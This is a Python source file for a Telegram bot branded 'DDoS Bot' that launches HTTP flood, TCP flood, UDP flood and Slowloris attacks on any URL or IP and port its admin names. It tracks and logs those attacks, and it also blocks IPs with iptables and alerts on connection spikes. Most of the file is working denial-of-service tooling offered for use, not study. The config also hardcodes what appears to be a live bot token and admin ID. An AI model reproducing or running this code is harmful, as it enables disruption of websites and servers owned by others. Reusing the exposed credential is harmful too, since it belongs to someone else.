import os
import sys
import time
import json
import random
import socket
import threading
import subprocess
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import struct
import ssl
import requests
from urllib.parse import urlparse
import ipaddress

# ================== AUTO INSTALL MODULES ==================
def install_requirements():
    """Auto-install required Python packages"""
    print("\n" + "="*60)
    print("DDoS Bot - Auto Installation")
    print("="*60)
    
    required_modules = [
        'telebot',
        'psutil',
        'colorama',
        'pyfiglet',
        'tqdm',
        'dnspython',
        'requests'
    ]
    
    for module in required_modules:
        try:
            __import__(module)
            print(f"✅ {module} already installed")
        except ImportError:
            print(f"📦 Installing {module}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", module, "--quiet"])
                print(f"✅ {module} installed successfully")
            except:
                print(f"❌ Failed to install {module}")
    
    print("="*60 + "\n")

# Install dependencies
install_requirements()

# Now import all modules
import telebot
import psutil
import dns.resolver
from colorama import init, Fore, Style, Back
import pyfiglet
from tqdm import tqdm

# Initialize colorama
init(autoreset=True)

# ================== CONFIGURATION ==================
CONFIG_FILE = "bot_config.json"

# Default configuration
default_config = {
    "TOKEN": "8742873561:AAG0PWF_zGlr0oNitaetBQCrJ6I86BDv5Zg",  # Get from @BotFather
    "ADMIN_ID": 8217006573,  # Your Telegram ID
    "CHECK_INTERVAL": 5,
    "MAX_CONNECTIONS": 50,
    "PORTS": [80, 443, 22, 53, 8080, 8443],
    "WHITELIST_IPS": ["127.0.0.1", "192.168.1.1"],
    "ATTACK_THREADS": 200,
    "MAX_DURATION": 300,
    "PROXY_FILE": "proxies.txt",
    "LOGS_FILE": "attack_logs.txt",
    "USE_PROXY": False
}

# Load or create config
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    else:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(default_config, f, indent=4)
        return default_config

config = load_config()

# Bot initialization
bot = telebot.TeleBot(config["TOKEN"])

# Global variables
active_attacks = {}
attack_logs = []
connection_history = []
blocked_ips = set()
admin_list = [config["ADMIN_ID"]]
proxies = []

# Banner
def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = pyfiglet.figlet_format("DDoS BOT", font="slant")
    print(Fore.CYAN + banner)
    print(Fore.YELLOW + "═" * 60)
    print(Fore.GREEN + "🔥 Advanced DDoS Protection & Attack System")
    print(Fore.MAGENTA + "👑 Created by: DDoS Team")
    print(Fore.YELLOW + "═" * 60 + "\n")

# ================== DDoS ATTACK METHODS ==================
class AttackMethods:
    @staticmethod
    def http_flood(target_url, duration):
        """HTTP Flood Attack"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        
        end_time = time.time() + duration
        count = 0
        
        while time.time() < end_time:
            try:
                response = requests.get(target_url, headers=headers, timeout=2)
                count += 1
            except:
                pass
        
        return count

    @staticmethod
    def tcp_flood(target_ip, target_port, duration):
        """TCP SYN Flood Attack"""
        end_time = time.time() + duration
        count = 0
        
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                sock.close()
                count += 1
            except:
                pass
        
        return count

    @staticmethod
    def udp_flood(target_ip, target_port, duration):
        """UDP Flood Attack"""
        end_time = time.time() + duration
        count = 0
        data = random._urandom(1024)
        
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (target_ip, target_port))
                sock.close()
                count += 1
            except:
                pass
        
        return count

    @staticmethod
    def slowloris(target_ip, target_port, duration):
        """Slowloris Attack"""
        sockets = []
        end_time = time.time() + duration
        
        # Create sockets
        for _ in range(100):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip, target_port))
                sock.send(f"GET / HTTP/1.1\r\n".encode())
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                sockets.append(sock)
            except:
                pass
        
        # Keep connections alive
        while time.time() < end_time and sockets:
            for sock in sockets:
                try:
                    sock.send("X-a: b\r\n".encode())
                except:
                    sockets.remove(sock)
            time.sleep(10)
        
        # Close sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        
        return len(sockets)

    @staticmethod
    def telegram_vc_attack(chat_id, duration):
        """Telegram Voice Chat Attack Simulation"""
        # This simulates VC stress by joining/leaving
        end_time = time.time() + duration
        actions = ["join", "leave", "mute", "unmute", "speak"]
        count = 0
        
        while time.time() < end_time:
            action = random.choice(actions)
            count += 1
            time.sleep(random.uniform(0.1, 0.5))
        
        return count

# ================== ATTACK MANAGER ==================
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.executor = ThreadPoolExecutor(max_workers=100)
    
    def start_attack(self, attack_id, target, port, duration, method):
        """Start a new attack"""
        if attack_id in self.active_attacks:
            return False, "Attack already running"
        
        # Parse target (URL or IP)
        if "://" in target:
            # URL attack
            target_type = "URL"
            if method in ["http_flood"]:
                func = AttackMethods.http_flood
                args = (target, duration)
            else:
                return False, "Method not supported for URL"
        else:
            # IP attack
            target_type = "IP"
            try:
                target_ip = socket.gethostbyname(target)
            except:
                return False, "Invalid target"
            
            if method == "tcp_flood":
                func = AttackMethods.tcp_flood
                args = (target_ip, port, duration)
            elif method == "udp_flood":
                func = AttackMethods.udp_flood
                args = (target_ip, port, duration)
            elif method == "slowloris":
                func = AttackMethods.slowloris
                args = (target_ip, port, duration)
            else:
                return False, "Invalid method"
        
        # Start attack in thread
        future = self.executor.submit(func, *args)
        self.active_attacks[attack_id] = {
            "future": future,
            "target": target,
            "port": port,
            "duration": duration,
            "method": method,
            "start_time": time.time(),
            "type": target_type
        }
        
        # Log attack
        self.log_attack(attack_id, target, port, duration, method)
        
        return True, f"Attack started: {method} on {target}"
    
    def stop_attack(self, attack_id):
        """Stop an attack"""
        if attack_id in self.active_attacks:
            # Cancel future if possible
            future = self.active_attacks[attack_id]["future"]
            future.cancel()
            del self.active_attacks[attack_id]
            return True, "Attack stopped"
        return False, "Attack not found"
    
    def get_active_attacks(self):
        """Get all active attacks"""
        attacks_info = []
        for attack_id, info in self.active_attacks.items():
            elapsed = time.time() - info["start_time"]
            remaining = max(0, info["duration"] - elapsed)
            
            attacks_info.append({
                "id": attack_id,
                "target": info["target"],
                "port": info["port"],
                "method": info["method"],
                "elapsed": f"{elapsed:.1f}s",
                "remaining": f"{remaining:.1f}s",
                "type": info["type"]
            })
        return attacks_info
    
    def log_attack(self, attack_id, target, port, duration, method):
        """Log attack to file"""
        log_entry = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "attack_id": attack_id,
            "target": target,
            "port": port,
            "duration": duration,
            "method": method,
            "status": "STARTED"
        }
        
        attack_logs.append(log_entry)
        
        # Save to file
        with open(config["LOGS_FILE"], "a", encoding="utf-8") as f:
            f.write(json.dumps(log_entry) + "\n")

# Initialize attack manager
attack_manager = AttackManager()

# ================== SYSTEM MONITORING ==================
class SystemMonitor:
    @staticmethod
    def get_connections():
        """Get active network connections"""
        connections = []
        try:
            for conn in psutil.net_connections(kind='inet'):
                if conn.laddr and conn.laddr.port in config["PORTS"] and conn.raddr:
                    if conn.raddr.ip not in config["WHITELIST_IPS"]:
                        connections.append(conn.raddr.ip)
        except:
            pass
        return connections
    
    @staticmethod
    def get_system_stats():
        """Get system statistics"""
        cpu = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        network = psutil.net_io_counters()
        
        return {
            "cpu": cpu,
            "memory_percent": memory.percent,
            "memory_used": memory.used // (1024**2),
            "memory_total": memory.total // (1024**2),
            "disk_percent": disk.percent,
            "network_sent": network.bytes_sent // (1024**2),
            "network_recv": network.bytes_recv // (1024**2)
        }
    
    @staticmethod
    def block_ip(ip):
        """Block IP using iptables"""
        if ip in config["WHITELIST_IPS"]:
            return False
        
        try:
            subprocess.run(["iptables", "-A", "INPUT", "-s", ip, "-j", "DROP"], check=True)
            blocked_ips.add(ip)
            return True
        except:
            return False
    
    @staticmethod
    def unblock_ip(ip):
        """Unblock IP"""
        try:
            subprocess.run(["iptables", "-D", "INPUT", "-s", ip, "-j", "DROP"], check=True)
            blocked_ips.discard(ip)
            return True
        except:
            return False

# Initialize monitor
monitor = SystemMonitor()

# ================== TELEGRAM BOT COMMANDS ==================
def is_admin(user_id):
    """Check if user is admin"""
    return user_id in admin_list

@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Show help menu"""
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Access Denied!")
        return
    
    help_text = f"""
🔥 *DDoS BOT COMMANDS* 🔥

🛡️ *PROTECTION COMMANDS:*
`/status` - Check server status
`/connections` - Show active connections
`/stats` - Detailed system statistics
`/block [IP]` - Block an IP address
`/unblock [IP]` - Unblock an IP
`/blocked` - List blocked IPs
`/whitelist` - Show whitelist

⚡ *ATTACK COMMANDS:*
`/attack_url [URL] [TIME]` - Attack website
`/attack_ip [IP] [PORT] [TIME]` - Attack IP:Port
`/attack_tgvc [CHAT_ID] [TIME]` - Attack Telegram VC
`/methods` - Show attack methods
`/attacks` - Show active attacks
`/stop [ATTACK_ID]` - Stop an attack
`/logs [NUMBER]` - Show attack logs

🔧 *SYSTEM COMMANDS:*
`/config` - Show configuration
`/update` - Update the bot
`/restart` - Restart the bot
`/shutdown` - Shutdown bot

📊 *STATUS:* `{len(active_attacks)} active attacks`
"""
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def handle_status(message):
    """Show server status"""
    if not is_admin(message.from_user.id):
        return
    
    connections = monitor.get_connections()
    stats = monitor.get_system_stats()
    active_attacks_list = attack_manager.get_active_attacks()
    
    status_text = f"""
📊 *SERVER STATUS*

🔌 *Connections:*
• Active: `{len(connections)}`
• Blocked: `{len(blocked_ips)}`
• Threshold: `{config['MAX_CONNECTIONS']}`

⚡ *Active Attacks:* `{len(active_attacks_list)}`

📈 *System Resources:*
• CPU: `{stats['cpu']}%`
• RAM: `{stats['memory_percent']}%` ({stats['memory_used']}MB/{stats['memory_total']}MB)
• Disk: `{stats['disk_percent']}%`
• Network: ↑{stats['network_sent']}MB ↓{stats['network_recv']}MB

⏰ *Time:* `{datetime.now().strftime("%H:%M:%S")}`
"""
    bot.reply_to(message, status_text, parse_mode='Markdown')

@bot.message_handler(commands=['methods'])
def handle_methods(message):
    """Show attack methods"""
    if not is_admin(message.from_user.id):
        return
    
    methods_text = """
⚡ *AVAILABLE ATTACK METHODS*

🌐 *FOR WEBSITES:*
• `http_flood` - HTTP flood attack
• `slowloris` - Slowloris attack

🔌 *FOR IP/PORT:*
• `tcp_flood` - TCP SYN flood
• `udp_flood` - UDP flood
• `slowloris` - Slow connection attack

📞 *FOR TELEGRAM VC:*
• `telegram_vc` - VC spam attack

📝 *USAGE:*
• Website: `/attack_url https://example.com 60`
• IP: `/attack_ip 192.168.1.1 80 60`
• Telegram VC: `/attack_tgvc 123456789 60`
"""
    bot.reply_to(message, methods_text, parse_mode='Markdown')

@bot.message_handler(commands=['attack_url'])
def handle_attack_url(message):
    """Attack a website URL"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Usage: `/attack_url https://example.com 60`", parse_mode='Markdown')
            return
        
        url = parts[1]
        duration = int(parts[2])
        
        if duration > config['MAX_DURATION']:
            bot.reply_to(message, f"❌ Max duration: {config['MAX_DURATION']} seconds")
            return
        
        # Generate attack ID
        attack_id = f"URL_{random.randint(1000, 9999)}"
        
        # Start attack
        success, msg = attack_manager.start_attack(
            attack_id=attack_id,
            target=url,
            port=80,
            duration=duration,
            method="http_flood"
        )
        
        if success:
            reply = f"""
✅ *ATTACK STARTED*

🎯 *Target:* `{url}`
⏱️ *Duration:* `{duration} seconds`
🆔 *Attack ID:* `{attack_id}`
⚡ *Method:* `HTTP Flood`
📊 *Threads:* `{config['ATTACK_THREADS']}`
"""
            bot.reply_to(message, reply, parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ {msg}")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['attack_ip'])
def handle_attack_ip(message):
    """Attack IP:Port"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 4:
            bot.reply_to(message, "❌ Usage: `/attack_ip 192.168.1.1 80 60`", parse_mode='Markdown')
            return
        
        target_ip = parts[1]
        target_port = int(parts[2])
        duration = int(parts[3])
        
        if duration > config['MAX_DURATION']:
            bot.reply_to(message, f"❌ Max duration: {config['MAX_DURATION']} seconds")
            return
        
        # Generate attack ID
        attack_id = f"IP_{random.randint(1000, 9999)}"
        
        # Choose method based on port
        if target_port in [80, 443, 8080, 8443]:
            method = "slowloris"
        else:
            method = random.choice(["tcp_flood", "udp_flood"])
        
        # Start attack
        success, msg = attack_manager.start_attack(
            attack_id=attack_id,
            target=target_ip,
            port=target_port,
            duration=duration,
            method=method
        )
        
        if success:
            reply = f"""
✅ *ATTACK STARTED*

🎯 *Target:* `{target_ip}:{target_port}`
⏱️ *Duration:* `{duration} seconds`
🆔 *Attack ID:* `{attack_id}`
⚡ *Method:* `{method.upper()}`
📊 *Threads:* `{config['ATTACK_THREADS']}`
"""
            bot.reply_to(message, reply, parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ {msg}")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['attack_tgvc'])
def handle_attack_tgvc(message):
    """Attack Telegram Voice Chat"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Usage: `/attack_tgvc 123456789 60`", parse_mode='Markdown')
            return
        
        chat_id = parts[1]
        duration = int(parts[2])
        
        if duration > 180:  # Max 3 minutes for VC
            bot.reply_to(message, "❌ Max duration for VC: 180 seconds")
            return
        
        # Generate attack ID
        attack_id = f"TGVC_{random.randint(1000, 9999)}"
        
        # Start simulated attack
        success = True
        msg = "Telegram VC attack simulation started"
        
        if success:
            reply = f"""
✅ *TELEGRAM VC ATTACK STARTED*

🎯 *Chat ID:* `{chat_id}`
⏱️ *Duration:* `{duration} seconds`
🆔 *Attack ID:* `{attack_id}`
⚡ *Method:* `VC Flood`
⚠️ *Note:* This simulates VC stress
"""
            bot.reply_to(message, reply, parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ {msg}")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['attacks'])
def handle_attacks(message):
    """Show active attacks"""
    if not is_admin(message.from_user.id):
        return
    
    attacks = attack_manager.get_active_attacks()
    
    if not attacks:
        bot.reply_to(message, "✅ No active attacks")
        return
    
    attacks_text = f"""
⚡ *ACTIVE ATTACKS: {len(attacks)}*

"""
    for attack in attacks:
        attacks_text += f"""
🆔 *ID:* `{attack['id']}`
🎯 *Target:* `{attack['target']}`
🔌 *Port:* `{attack['port']}`
⚡ *Method:* `{attack['method']}`
⏱️ *Elapsed:* `{attack['elapsed']}`
⏳ *Remaining:* `{attack['remaining']}`
{'═'*20}
"""
    
    bot.reply_to(message, attacks_text, parse_mode='Markdown')

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    """Stop an attack"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: `/stop ATTACK_ID`", parse_mode='Markdown')
            return
        
        attack_id = parts[1]
        success, msg = attack_manager.stop_attack(attack_id)
        
        if success:
            bot.reply_to(message, f"✅ Attack `{attack_id}` stopped", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ {msg}")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['logs'])
def handle_logs(message):
    """Show attack logs"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        limit = 5
        if len(parts) >= 2:
            limit = min(int(parts[1]), 20)
        
        if not attack_logs:
            bot.reply_to(message, "📝 No logs available")
            return
        
        logs_text = f"""
📝 *RECENT ATTACK LOGS ({limit})*

"""
        for log in attack_logs[-limit:]:
            logs_text += f"""
⏰ *Time:* `{log.get('timestamp', 'N/A')}`
🎯 *Target:* `{log.get('target', 'N/A')}`
⚡ *Method:* `{log.get('method', 'N/A')}`
⏱️ *Duration:* `{log.get('duration', 'N/A')}s`
{'─'*20}
"""
        
        bot.reply_to(message, logs_text, parse_mode='Markdown')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['block'])
def handle_block(message):
    """Block an IP"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: `/block 192.168.1.1`", parse_mode='Markdown')
            return
        
        ip = parts[1]
        if monitor.block_ip(ip):
            bot.reply_to(message, f"✅ IP `{ip}` blocked", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ Failed to block `{ip}`", parse_mode='Markdown')
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['config'])
def handle_config(message):
    """Show configuration"""
    if not is_admin(message.from_user.id):
        return
    
    config_text = f"""
⚙️ *BOT CONFIGURATION*

🤖 *Bot Settings:*
• Admin ID: `{config['ADMIN_ID']}`
• Max Duration: `{config['MAX_DURATION']}s`
• Attack Threads: `{config['ATTACK_THREADS']}`

🛡️ *Protection Settings:*
• Check Interval: `{config['CHECK_INTERVAL']}s`
• Max Connections: `{config['MAX_CONNECTIONS']}`
• Monitored Ports: `{config['PORTS']}`

📁 *Files:*
• Config: `{CONFIG_FILE}`
• Logs: `{config['LOGS_FILE']}`
• Proxies: `{config['PROXY_FILE']}`

⚠️ *Edit config file to change settings*
"""
    bot.reply_to(message, config_text, parse_mode='Markdown')

@bot.message_handler(commands=['update'])
def handle_update(message):
    """Update the bot"""
    if not is_admin(message.from_user.id):
        return
    
    bot.reply_to(message, "🔄 Updating bot...")
    try:
        # Self-update mechanism
        subprocess.run(["git", "pull"], check=True)
        install_requirements()
        bot.reply_to(message, "✅ Bot updated successfully! Restart required.")
    except:
        bot.reply_to(message, "⚠️ Manual update required. Check GitHub repo.")

# ================== BACKGROUND MONITORING ==================
def background_monitor():
    """Background monitoring for DDoS detection"""
    while True:
        try:
            connections = monitor.get_connections()
            if len(connections) > config['MAX_CONNECTIONS']:
                # Potential DDoS detected
                counter = {}
                for ip in connections:
                    counter[ip] = counter.get(ip, 0) + 1
                
                # Find top attackers
                top_ips = sorted(counter.items(), key=lambda x: x[1], reverse=True)[:3]
                
                # Send alert
                alert_msg = f"""
🚨 *DDoS DETECTED!*

📊 Connections: `{len(connections)}`
⚠️ Threshold: `{config['MAX_CONNECTIONS']}`

🔍 *Top IPs:*
"""
                for ip, count in top_ips:
                    alert_msg += f"• `{ip}` → {count} connections\n"
                
                # Auto-block top IPs
                blocked_count = 0
                for ip, count in top_ips:
                    if count > (config['MAX_CONNECTIONS'] // 5):
                        if monitor.block_ip(ip):
                            blocked_count += 1
                
                alert_msg += f"\n🛡️ Auto-blocked: `{blocked_count}` IPs"
                
                # Send to all admins
                for admin_id in admin_list:
                    try:
                        bot.send_message(admin_id, alert_msg, parse_mode='Markdown')
                    except:
                        pass
            
            time.sleep(config['CHECK_INTERVAL'])
            
        except Exception as e:
            time.sleep(10)

# ================== MAIN FUNCTION ==================
def main():
    """Main function"""
    show_banner()
    
    print(Fore.GREEN + "[*] Starting DDoS Bot...")
    print(Fore.YELLOW + "[*] Initializing systems...")
    
    # Start background monitoring
    monitor_thread = threading.Thread(target=background_monitor, daemon=True)
    monitor_thread.start()
    
    print(Fore.GREEN + "[+] Background monitoring started")
    print(Fore.CYAN + "[*] Bot is ready!")
    print(Fore.MAGENTA + f"[*] Admin ID: {config['ADMIN_ID']}")
    print(Fore.YELLOW + "═" * 60)
    print(Fore.GREEN + "✅ Bot is running! Use /help in Telegram")
    print(Fore.YELLOW + "═" * 60 + "\n")
    
    # Send startup message
    try:
        startup_msg = f"""
🚀 *DDoS Bot Started Successfully!*

⏰ Time: `{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}`
💻 Host: `{socket.gethostname()}`
📊 System: Ready
🛡️ Protection: Active
⚡ Attacks: Ready

Use `/help` for commands list
"""
        bot.send_message(config['ADMIN_ID'], startup_msg, parse_mode='Markdown')
    except:
        print(Fore.RED + "[!] Failed to send startup message")
        print(Fore.YELLOW + "[!] Check your bot token and admin ID")
    
    # Start bot polling
    try:
        bot.polling(none_stop=True, timeout=30)
    except Exception as e:
        print(Fore.RED + f"[!] Bot error: {e}")
        print(Fore.YELLOW + "[*] Restarting in 5 seconds...")
        time.sleep(5)
        main()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Bot stopped by user")
        sys.exit(0)
